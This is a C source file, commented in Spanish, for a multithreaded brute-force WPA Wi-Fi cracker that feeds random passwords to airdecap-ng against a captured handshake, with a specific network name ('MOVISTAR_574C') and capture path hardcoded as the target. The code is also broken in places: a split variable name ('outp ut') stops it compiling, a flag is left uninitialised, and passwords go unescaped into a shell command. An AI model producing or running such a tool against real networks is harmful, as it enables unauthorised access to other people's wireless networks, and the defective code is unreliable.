#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <stdbool.h>
#include <string.h>
#include <regex.h>
#include <pthread.h>

//Colores
const char *g = "\033[0;32m\033[1m";
const char *end = "\033[0m\033[0m";
const char *r = "\033[0;31m\033[1m";
const char *b = "\033[0;34m\033[1m";
const char *y = "\033[0;33m\033[1m";
const char *p = "\033[0;35m\033[1m";
const char *t = "\033[0;36m\033[1m";
const char *gray = "\033[0;37m\033[1m";


//Prototipo de funciones
int generate_random_length();
char* generate_random_password(char letts[], int size, int long_passwd);
char* decrypt_packets(const char* password, const char* network_to_attack, const char* file);
int confirm_packets(const char* prove);
void* generate_passwords(void* arg);
int init_crack_cap(int large, char* network_to_attack, char* file, int threads);

typedef struct Node {
    char password[26];
    struct Node* next;
} Node;

// Estructura para pasar los argumentos a generate_passwords
typedef struct {
    int char_of_passwd;
    const char* network_to_attack;
    const char* file;
} ThreadArguments;

void initialize_password_list(Node** head) {
    *head = NULL;
}

bool is_password_used(const char* password, const Node* head) {
    const Node* current = head;
    while (current != NULL) {
        if (strcmp(password, current->password) == 0) {
            return true;
        }
        current = current->next;
    }
    return false;
}

void add_password(const char* password, Node** head) {
    Node* newNode = (Node*)malloc(sizeof(Node));
    strcpy(newNode->password, password);
    newNode->next = *head;
    *head = newNode;
}

void free_password_list(Node** head) {
    Node* current = *head;
    while (current != NULL) {
        Node* next = current->next;
        free(current);
        current = next;
    }
    *head = NULL;
}

int generate_random_length() {
    int passwd_length = (rand() % 13) + 8;
    return passwd_length;
}

long try = 0;
bool password_found = false;  // Variable compartida que indica si se encontró la contraseña
pthread_mutex_t lock;  // Mutex para sincronización

char* generate_random_password(char letts[], int size, int long_passwd) {
    char* passwd = (char*)malloc((long_passwd + 1) * sizeof(char));
    for (int i = 0; i < long_passwd; ++i) {
        int position = rand() % size;
        passwd[i] = letts[position];
    }
    //++try;    
    passwd[long_passwd] = '\0';
    return passwd;
}

char* decrypt_packets(const char* password, const char* network_to_attack, const char* file) {
    char command[300];
    snprintf(command, sizeof(command), "airdecap-ng -p %s -e %s %s", password, network_to_attack, file);

    FILE* fp = popen(command, "r");
    if (fp == NULL) {
        fprintf(stderr, "\n\nError occurred while try to decrypt\n");
        exit(1);
    }

    // Descartar las primeras 7 líneas
    char buffer[100];
    for (int i = 0; i < 7; i++) {
        fgets(buffer, sizeof(buffer), fp);
    }

    char* outp ut = (char*)malloc(100 * sizeof(char));
    fgets(output, 100, fp);

    pclose(fp);  
    return output;
}

int confirm_packets(const char* prove) {    
    const char* substring = "Number of decrypted WPA  packets";
    char* position = strstr(prove, substring);

    if (position == NULL) { 
        return 0;
    }

    //Variables
    regex_t regex;
    int ret;
    regmatch_t matches[2];
    char* pattern = "([0-9]+)";

    ret = regcomp(&regex, pattern, REG_EXTENDED);
    if (ret != 0) {
        printf("Error compiling regular expression\n");
        return 0;
    }

    ret = regexec(&regex, prove, 2, matches, 0);
    if (ret == 0) {
        char match[matches[1].rm_eo - matches[1].rm_so + 1];
        strncpy(match, prove + matches[1].rm_so, matches[1].rm_eo - matches[1].rm_so);
        match[matches[1].rm_eo - matches[1].rm_so] = '\0';

        // Obtener el número como entero
        int number = atoi(match);

        //Liberamos al ejecutor de regex
        regfree(&regex);

        //Comprobamos si hemos desencriptado los paquetes
        if (number > 1){
            return number;
        }
        else{
            return 0;
        }

        // Sin coincidiencias
    } else if (ret == REG_NOMATCH) {
        regfree(&regex); 
        return 0;
        // lo demás
    } else {
        regfree(&regex);
        return 0;
    }
}

void* generate_passwords(void* arg) {

    //Arrgelamos argumentos
    ThreadArguments* args = (ThreadArguments*)arg;
    int char_of_passwd = args->char_of_passwd;
    const char* network_to_attack = args->network_to_attack;
    const char* file = args->file;

    srand(time(NULL));

    char letters[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int letters_size = sizeof(letters) - 1;

    Node* passwordsList;
    initialize_password_list(&passwordsList);

    int size = char_of_passwd;
    bool random_length;

    if (char_of_passwd == 0) {
        random_length = true;
    }
    
    while (!password_found) {
        if(random_length)
            size = (rand() % 13) + 8;        

        char* password = password = generate_random_password(letters, letters_size, size);
            
        pthread_mutex_lock(&lock); // Bloqueamos el mutex para evitar acceso simultáneo a password_found
        if (!password_found && !is_password_used(password, passwordsList)) {
            add_password(password, &passwordsList);
            pthread_mutex_unlock(&lock);

            char* result = decrypt_packets(password, network_to_attack, file); 
            int comprobe = confirm_packets(result);
            free(result);

            if (comprobe > 0) { 
                pthread_mutex_lock(&lock); // Bloqueamos el mutex para evitar acceso simultáneo a password_found
                if (!password_found)
                    password_found = true; 

                //mostramos contraseña
                printf("\n\n\t\t%s[!]%s PASSWORD FOUND%s -----> %s%s%s", y, b, y, r, password, end);
                printf("\n\t\t%s[*]%s Decrypted Packets%s -----> %d %s\n\n", y, b, y, comprobe, end);

                //Liberamos memoria
                free_password_list(&passwordsList);
                pthread_mutex_unlock(&lock); // Desbloqueamos el mutex
                free(password); 
                break;
                
            }

            printf("\t%s[♦] Attempt:%s %ld     \t%sPASSWD: %s%s\r", y, b, try, y, b,password);
            try++;
            
        }

    }
    return NULL;
}

int init_crack_cap(int large, char* network_to_attack, char* file, int threads){
    //Variables para iniciar
    pthread_t thread_ids[threads]; 
    ThreadArguments args;
    args.char_of_passwd = large;
    args.network_to_attack = network_to_attack;
    args.file = file;
 
    pthread_mutex_init(&lock, NULL); // Inicializamos el mutex
    
    //Creamos hilos
    for(int i = 0; i < threads; i++) {
        pthread_create(&thread_ids[i], NULL, generate_passwords, (void*)&args);
    }

    // Esperamos a que terminen
    for (int i = 0; i < threads; i++){
        pthread_join(thread_ids[i], NULL);
    }

    pthread_mutex_destroy(&lock); // Destruimos el mutex

    return 0;
}

int main() {
    //Varibles necesarias
    int char_of_passwd = 0;
    int threads = 500;
    const char* network_to_attack = "MOVISTAR_574C";
    const char* file = "/root/EvilHunter_Data/captures/MOVISTAR_574C/test0-01.cap"; 

    //Informacion relacionada con threads
    pthread_t thread_ids[threads]; 
    ThreadArguments args;
    args.char_of_passwd = char_of_passwd;
    args.network_to_attack = network_to_attack;
    args.file = file;
    
    // Creamos
    for(int i = 0; i < threads; i++) {
        pthread_create(&thread_ids[i], NULL, generate_passwords, (void*)&args);
    }

    // Esperamos a que terminen
    for (int i = 0; i < threads; i++){
        pthread_join(thread_ids[i], NULL);
    }

    // Salimos con exito
    return 0;
}
